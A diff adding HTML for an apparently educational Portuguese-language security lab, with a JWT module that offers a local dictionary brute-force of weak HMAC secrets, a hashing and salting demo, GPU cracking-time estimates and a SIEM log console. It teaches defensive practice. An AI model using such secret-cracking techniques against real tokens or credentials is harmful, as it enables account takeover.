+              <button type="button" class="preset-chip" id="btn-jwt-expire">
+                <i class="fas fa-hourglass-end"></i> Expirar Token
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Coluna 3: Secret & Validação Criptográfica -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title text-cyan"><i class="fas fa-key"></i> 3. HMAC-SHA256 &amp; Verificação</span>
+            <span class="crypto-tag font-mono">WEB CRYPTO</span>
+          </div>
+          <div class="card-panel-body">
+            <div class="form-group">
+              <label for="jwt-secret-input" class="form-label">Segredo do Servidor (HMAC Secret):</label>
+              <input type="text" id="jwt-secret-input" class="form-input" value="sandro-super-secret-key-2026" spellcheck="false">
+            </div>
+
+            <!-- Status Criptográfico -->
+            <label class="form-label">Diagnóstico de Integridade do Token:</label>
+            <div class="jwt-status-card jwt-status--valid" id="jwt-status-card">
+              <i class="fas fa-check-circle" id="jwt-status-icon"></i>
+              <span id="jwt-status-msg">ASSINATURA ÍNTEGRA &amp; VÁLIDA (HMAC-SHA256)</span>
+            </div>
+
+            <button type="button" class="btn-sec btn-sec--primary" id="btn-jwt-resign" style="width: 100%;">
+              <i class="fas fa-signature"></i> Assinar Novamente com Segredo
+            </button>
+
+            <!-- Brute-Force de Chave Fraca -->
+            <div class="jwt-bruteforce-box">
+              <div class="jwt-bruteforce-title">
+                <i class="fas fa-microchip text-amber"></i> Brute-Force Local de Segredo Fraco:
+              </div>
+              <p style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 0.5rem;">
+                Ataque de dicionário executado nativamente via <code>crypto.subtle</code> contra senhas comuns.
+              </p>
+              <button type="button" class="btn-sec btn-sec--outline" id="btn-jwt-bruteforce" style="width: 100%;">
+                <i class="fas fa-bolt text-amber"></i> Testar Dicionário de Chaves
+              </button>
+              <div class="jwt-bruteforce-result" id="jwt-bruteforce-result">
+                <!-- Resultado do Brute-force -->
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ======================================================================
+         MÓDULO 5: Hashing, Salt & Resistência a Força Bruta
+         ====================================================================== -->
+    <section class="module-panel" id="panel-hash" role="tabpanel" aria-labelledby="tab-btn-hash">
+      <div class="module-header">
+        <div class="module-info">
+          <div class="module-tag-row">
+            <span class="owasp-tag"><i class="fas fa-triangle-exclamation"></i> OWASP A02:2021 — CRYPTOGRAPHIC FAILURES</span>
+            <span class="crypto-tag"><i class="fas fa-hashtag"></i> FIPS 180-4 HASH STANDARDS</span>
+            <span class="rfc-tag"><i class="fas fa-stopwatch"></i> ITERATIVE WORK FACTOR</span>
+          </div>
+          <h2 class="module-title">Laboratório de Hashing, Salting &amp; Força Bruta</h2>
+          <p class="module-desc">
+            Compreenda por que funções de hash rápidas (MD5, SHA-1 e SHA-256) não são adequadas para armazenamento de senhas sem salt criptográfico e prova de trabalho iterativa (Bcrypt). Execute benchmarks em tempo real diretamente na CPU do seu navegador.
+          </p>
+        </div>
+      </div>
+
+      <!-- Barra de Entrada de Senha -->
+      <div class="hash-input-bar">
+        <div class="hash-input-field">
+          <input type="text" id="hash-input-text" class="form-input" value="senha123" placeholder="Digite uma senha ou texto para gerar os hashes..." spellcheck="false">
+        </div>
+        <button type="button" class="btn-sec btn-sec--outline" id="btn-hash-random" title="Gerar senha aleatória">
+          <i class="fas fa-dice"></i> Gerar Aleatória
+        </button>
+      </div>
+
+      <!-- Presets de Senhas -->
+      <div class="presets-container" style="margin-bottom: 1.25rem;">
+        <button type="button" class="preset-chip active" data-hash-val="senha123">"senha123" (Fraca)</button>
+        <button type="button" class="preset-chip" data-hash-val="admin2026">"admin2026" (Comum)</button>
+        <button type="button" class="preset-chip" data-hash-val="P@ssw0rd!#2026">"P@ssw0rd!#2026" (Complexa)</button>
+        <button type="button" class="preset-chip" data-hash-val="correct-horse-battery-staple">"correct-horse-battery-staple" (Passphrase)</button>
+      </div>
+
+      <!-- Grade dos 4 Hashes em Tempo Real -->
+      <div class="hash-cards-grid">
+        <!-- MD5 -->
+        <div class="hash-card">
+          <div class="hash-card-header">
+            <span class="hash-card-name"><i class="fas fa-triangle-exclamation text-crimson"></i> MD5 (128 bits)</span>
+            <span class="hash-card-badge badge-danger">OBSOLETO / COLISÕES REAIS</span>
+          </div>
+          <div class="hash-digest-val font-mono" id="digest-md5">Calculando...</div>
+          <span class="hash-card-info">Quebrado teoricamente e praticamente. Inseguro para senhas e assinaturas.</span>
+        </div>
+
+        <!-- SHA-1 -->
+        <div class="hash-card">
+          <div class="hash-card-header">
+            <span class="hash-card-name"><i class="fas fa-triangle-exclamation text-amber"></i> SHA-1 (160 bits)</span>
+            <span class="hash-card-badge badge-warn">DESACONSELHADO (SHAttered)</span>
+          </div>
+          <div class="hash-digest-val font-mono" id="digest-sha1">Calculando...</div>
+          <span class="hash-card-info">Colisão demonstrada pelo Google/CWI em 2017. Descontinuado para certificados.</span>
+        </div>
+
+        <!-- SHA-256 -->
+        <div class="hash-card">
+          <div class="hash-card-header">
+            <span class="hash-card-name"><i class="fas fa-shield-check text-emerald"></i> SHA-256 (256 bits)</span>
+            <span class="hash-card-badge badge-secure">SEGURO PARA INTEGRIDADE</span>
+          </div>
+          <div class="hash-digest-val font-mono" id="digest-sha256">Calculando...</div>
+          <span class="hash-card-info">Calculado via Web Crypto API nativa. Excelente integridade, mas rápido demais para senhas puras.</span>
+        </div>
+
+        <!-- Bcrypt Simulator -->
+        <div class="hash-card">
+          <div class="hash-card-header">
+            <span class="hash-card-name"><i class="fas fa-lock text-cyan"></i> Bcrypt Simulator (Cost 12)</span>
+            <span class="hash-card-badge badge-cyan">RECOMENDADO PARA SENHAS</span>
+          </div>
+          <div class="hash-digest-val font-mono" id="digest-bcrypt">$2b$12$...</div>
+          <span class="hash-card-info">Função lenta com custo computacional iterativo (4.096 rounds). Resistente a clusters de GPUs.</span>
+        </div>
+      </div>
+
+      <!-- Comparativo de Salt & Rainbow Tables -->
+      <div class="salt-comparison-wrap">
+        <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem;">
+          <div>
+            <h3 style="font-size: 0.95rem; font-weight: 700; color: var(--text-pure);"><i class="fas fa-layer-group text-violet"></i> Demonstração Visual de Salting &amp; Imunidade a Rainbow Tables</h3>
+            <p style="font-size: 0.78rem; color: var(--text-secondary); margin-top: 0.2rem;">
+              Cenário: Dois usuários distintos cadastrados na mesma empresa que escolheram exatamente a mesma senha: <code class="text-cyan">"senha123"</code>.
+            </p>
+          </div>
+          <button type="button" class="btn-sec btn-sec--outline" id="btn-regen-salts">
+            <i class="fas fa-dice-d20"></i> Regenerar Salts Aleatórios
+          </button>
+        </div>
+
+        <div class="salt-scenario-grid">
+          <!-- Caso Sem Salt -->
+          <div class="salt-scenario-card">
+            <div class="salt-scenario-title text-crimson">
+              <i class="fas fa-circle-xmark"></i> CASO A: ARMAZENAMENTO SEM SALT (VULNERÁVEL)
+            </div>
+            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.6; font-family: var(--font-mono);">
+              • Usuário 1 (Mariana): SHA256("senha123")<br>
+              ➔ <span class="text-crimson" id="salt-user1-unsalted">55525fc3606e633290b48f410ff49ec0...</span><br><br>
+              • Usuário 2 (Roberto): SHA256("senha123")<br>
+              ➔ <span class="text-crimson" id="salt-user2-unsalted">55525fc3606e633290b48f410ff49ec0...</span>
+            </div>
+            <div style="margin-top: 0.75rem; padding: 0.5rem; background: rgba(239, 68, 68, 0.1); border-radius: var(--radius-xs); border: 1px solid var(--sec-crimson-border); font-size: 0.72rem; color: var(--sec-crimson-bright);">
+              ⚠️ HASHES IDÊNTICOS! Revela o padrão entre contas e uma única consulta em Rainbow Table quebra ambos instantaneamente.
+            </div>
+          </div>
+
+          <!-- Caso Com Salt -->
+          <div class="salt-scenario-card">
+            <div class="salt-scenario-title text-emerald">
+              <i class="fas fa-shield-halved"></i> CASO B: COM SALT DE 16 BYTES CSPRNG (SEGURO)
+            </div>
+            <div style="font-size: 0.75rem; color: var(--text-secondary); line-height: 1.6; font-family: var(--font-mono);">
+              • Usuário 1 (Mariana): Salt: <span class="text-violet" id="salt-val-1">9a7b...</span> + "senha123"<br>
+              ➔ <span class="text-emerald" id="salt-user1-salted">Calculando...</span><br><br>
+              • Usuário 2 (Roberto): Salt: <span class="text-violet" id="salt-val-2">3f21...</span> + "senha123"<br>
+              ➔ <span class="text-emerald" id="salt-user2-salted">Calculando...</span>
+            </div>
+            <div style="margin-top: 0.75rem; padding: 0.5rem; background: rgba(16, 185, 129, 0.1); border-radius: var(--radius-xs); border: 1px solid var(--sec-emerald-border); font-size: 0.72rem; color: var(--sec-emerald-bright);">
+              🛡️ HASHES TOTALMENTE DISTINTOS! Mesmo com a mesma senha, a tabela arco-íris torna-se inútil pois teria que ser recalculada para cada salt de 128 bits.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Benchmark e Projeção de GPU -->
+      <div class="benchmark-card">
+        <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem;">
+          <div>
+            <h3 style="font-size: 0.95rem; font-weight: 700; color: var(--text-pure);"><i class="fas fa-stopwatch text-cyan"></i> Benchmark Local ao Vivo &amp; Estimativa de Quebra em GPU</h3>
+            <p style="font-size: 0.78rem; color: var(--text-secondary); margin-top: 0.2rem;">
+              Execute um teste empírico de processamento de 10.000 digests SHA-256 via <code>crypto.subtle</code> no hardware local.
+            </p>
+          </div>
+          <button type="button" class="btn-sec btn-sec--primary" id="btn-run-benchmark">
+            <i class="fas fa-bolt"></i> Rodar Benchmark (10.000 Hashes)
+          </button>
+        </div>
+
+        <div class="benchmark-result-banner" id="benchmark-result-banner">
+          Clique no botão acima para iniciar o benchmark de taxa de hash do navegador.
+        </div>
+
+        <!-- Tabela de Projeção GPU -->
+        <div class="gpu-table-wrap">
+          <table class="gpu-table">
+            <thead>
+              <tr>
+                <th>Função Criptográfica</th>
+                <th>Throughput Médio (Cluster GPU RTX 4090)</th>
+                <th>Senha 6 Caracteres</th>
+                <th>Senha 8 Caracteres Alfanumérica</th>
+                <th>Senha 12 Caracteres Complexa</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="font-mono text-crimson">MD5 (Sem Salt)</td>
+                <td>~ 20.000.000.000 hashes/seg</td>
+                <td class="text-crimson font-mono">&lt; 0.05 segundos</td>
+                <td class="text-crimson font-mono">&lt; 12 minutos</td>
+                <td class="text-amber font-mono">~ 3.2 semanas</td>
+              </tr>
+              <tr>
+                <td class="font-mono text-amber">SHA-256 (Sem Salt)</td>
+                <td>~ 5.000.000.000 hashes/seg</td>
+                <td class="text-crimson font-mono">&lt; 0.2 segundos</td>
+                <td class="text-crimson font-mono">~ 48 minutos</td>
+                <td class="text-amber font-mono">~ 3.5 meses</td>
+              </tr>
+              <tr>
+                <td class="font-mono text-emerald">Bcrypt (Cost 12 / 4.096 rounds)</td>
+                <td>~ 3.000 hashes/seg</td>
+                <td class="text-amber font-mono">~ 2.8 dias</td>
+                <td class="text-emerald font-mono">~ 2.300 ANOS</td>
+                <td class="text-emerald font-mono">&gt; 100 BILHÕES DE ANOS</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ==========================================================================
+       4. CONSOLE SIEM HUD UNIFICADO (TERMINAL DOCKED INFERIOR)
+       ========================================================================== -->
+  <aside class="cyber-siem-hud is-collapsed" id="siem-hud" aria-label="Console de Auditoria e Eventos de Segurança">
+    <!-- Barra de Controle do SIEM -->
+    <div class="siem-bar" id="siem-bar">
+      <div class="siem-bar-left">
+        <span class="siem-pulse-dot"></span>
+        <span class="siem-hud-title">SIEM AUDIT HUD</span>
+        <div class="siem-filters" id="siem-filters">
+          <button type="button" class="siem-filter-btn is-active" data-filter="all">TODOS (<span id="count-all">0</span>)</button>
+          <button type="button" class="siem-filter-btn" data-filter="EXPLOIT">EXPLOIT (<span id="count-exploit">0</span>)</button>
+          <button type="button" class="siem-filter-btn" data-filter="BLOCKED">BLOCKED (<span id="count-blocked">0</span>)</button>
+          <button type="button" class="siem-filter-btn" data-filter="CRYPTO">CRYPTO (<span id="count-crypto">0</span>)</button>
+          <button type="button" class="siem-filter-btn" data-filter="WARN">WARN (<span id="count-warn">0</span>)</button>
+        </div>
+        <div class="siem-ticker-preview" id="siem-ticker-preview">
+          Workbench inicializado. Web Crypto API ativa.
+        </div>
+      </div>
+
+      <div class="siem-bar-right">
+        <button type="button" class="siem-tool-btn" id="btn-siem-copy" title="Copiar todos os logs para o clipboard">
+          <i class="fas fa-copy"></i> Copiar
+        </button>
+        <button type="button" class="siem-tool-btn" id="btn-siem-clear" title="Limpar histórico do console">
+          <i class="fas fa-trash-can"></i> Limpar
+        </button>
+        <button type="button" class="siem-tool-btn" id="btn-siem-toggle" title="Expandir/Recolher Terminal (Alt + L)">
+          <i class="fas fa-chevron-up" id="siem-toggle-icon"></i>
+          <span class="kbd">Alt+L</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Viewport dos Logs -->
+    <div class="siem-log-viewport" id="siem-log-viewport" role="log" aria-live="polite">
+      <!-- Logs injetados aqui dinamicamente -->
+    </div>
+  </aside>
+
+  <!-- ==========================================================================
+       5. MODAL DE RELATÓRIO FORENSE / AUDITORIA
+       ========================================================================== -->
+  <div class="cyber-modal-backdrop" id="export-modal" role="dialog" aria-modal="true" aria-labelledby="modal-report-title">
+    <div class="cyber-modal-card">
+      <div class="cyber-modal-header">
+        <div style="display: flex; align-items: center; gap: 0.5rem;">
+          <i class="fas fa-file-shield text-cyan"></i>
+          <h3 id="modal-report-title" style="font-size: 0.95rem; font-weight: 700; color: var(--text-pure);">Relatório de Auditoria &amp; Telemetria Forense</h3>
+        </div>
+        <button type="button" class="siem-tool-btn" id="btn-close-modal" aria-label="Fechar Modal">
+          <i class="fas fa-xmark"></i>
+        </button>
+      </div>
+      <div class="cyber-modal-body">
+        <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 0.75rem;">
+          Resumo consolidado das operações, testes de penetração e mecanismos defensivos testados durante a sessão no CyberSec Lab.
+        </p>
+        <div class="form-group">
+          <label class="form-label">Exportação Estruturada (JSON):</label>
+          <textarea id="report-preview-json" class="form-textarea" readonly style="min-height: 220px; font-size: 0.72rem;"></textarea>
+        </div>
+      </div>
+      <div class="cyber-modal-footer">
+        <button type="button" class="btn-sec btn-sec--outline" id="btn-download-txt">
+          <i class="fas fa-file-lines"></i> Baixar Relatório (.txt)
+        </button>
+        <button type="button" class="btn-sec btn-sec--primary" id="btn-download-json">
+          <i class="fas fa-download"></i> Baixar Relatório (.json)
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Script Vanilla ES6+ Principal -->
+  <script src="script.js?v=2"></script>
+</body>
+</html>
